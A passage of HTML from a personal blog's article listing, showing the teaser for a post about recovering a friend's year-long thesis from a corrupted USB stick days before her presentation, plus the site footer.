</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2016/12/18/Forensics-911-recovering-thesis.html"><h2 class="larger">Forensics 911 - recovering a thesis of one year work</h2></a>
          <br><span class="smaller">December 18, 2016</span>  <br/>
          <div><p>A friend of mine called me: a girl friend of him was hopeless trying to recover her thesis from a corrupted usb stick <em>three days</em> before her presentation.</p>

<p>She was working in her thesis for almost a year, saving all the progresses in that usb stick. But what she didn’t know was that an usb memory has a limited number of writes and with more writes eventually the file system gets corrupted.</p>

<p>This is the real story behind a forensics rally trying to recover her one year work.</p>

</div>
        </li>
    
  </ul>

    </article>
    <span class="print-footer">Blog - Gehn</span>
    <footer>
    <hr class="slender">
    <div class="credits">
        <span>&copy; 2019
            
            Gehn</span></br> <br>
        

    <span>Created with <a href="//jekyllrb.com">Jekyll</a> and the theme <a href="//github.com/sdruskat/tufte-css-jekyll">tufte-css-jekyll</a>.</span>
    </div>
</footer>

  </body>
</html>
